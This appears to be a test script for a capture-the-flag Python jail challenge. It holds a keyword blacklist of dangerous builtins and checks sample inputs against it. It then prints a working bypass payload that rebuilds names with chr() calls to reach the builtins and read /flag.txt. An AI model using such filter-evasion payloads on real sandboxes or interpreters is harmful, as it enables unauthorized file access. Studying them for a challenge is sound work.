#!/usr/bin/env python3
"""
Quick test script to verify the jail works correctly
"""

print("Testing Blacklist-Hell Challenge")
print("=" * 50)

# Test 1: Check blacklist detection
blacklist = ["/","0","1","2","3","4","5","6","7","8","9","setattr","compile","globals","os","import","_","breakpoint","exit","lambda","eval","exec","read","print","open","'","=",'"',"x","builtins","clear"]

test_inputs = [
    ("chr(65)", True, "Should pass - no blacklisted words"),
    ("open('file')", False, "Should fail - contains 'open' and quotes"),
    ("print(test)", False, "Should fail - contains 'print'"),
    ("len([])", True, "Should pass - basic operation"),
    ("import os", False, "Should fail - contains 'import' and 'os'"),
    ("__builtins__", False, "Should fail - contains underscores"),
    ("chr(95)+chr(95)", True, "Should pass - builds underscores dynamically"),
]

print("\nTesting blacklist detection:\n")
for test_input, should_pass, description in test_inputs:
    blocked = any(c in test_input for c in blacklist)
    status = "✓ PASS" if (not blocked) == should_pass else "✗ FAIL"
    print(f"{status} | {description}")
    print(f"       Input: {test_input}")
    print(f"       Blocked: {blocked} (Expected: {not should_pass})")
    print()

# Test 2: Verify chr() building
print("\nTesting chr() string building:\n")
test_chr = chr(111)+chr(112)+chr(101)+chr(110)
print(f"chr(111)+chr(112)+chr(101)+chr(110) = '{test_chr}'")
print(f"Expected: 'open' | Match: {test_chr == 'open'}")

# Test 3: Verify number generation
print("\nTesting number generation without digits:\n")
zero = len([])
one = len([[]])
two = len([[],[]])
print(f"len([]) = {zero}")
print(f"len([[]]) = {one}")  
print(f"len([[],[]]) = {two}")

# Test 4: Show a working payload
print("\n" + "="*50)
print("Example working payload (simplified):")
print("="*50)
payload = """getattr(
    getattr(
        vars()[chr(95)+chr(95)+chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)+chr(95)+chr(95)],
        chr(111)+chr(112)+chr(101)+chr(110)
    )(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)),
    chr(114)+chr(101)+chr(97)+chr(100)
)()"""
print(payload)

print("\n" + "="*50)
print("All tests completed!")
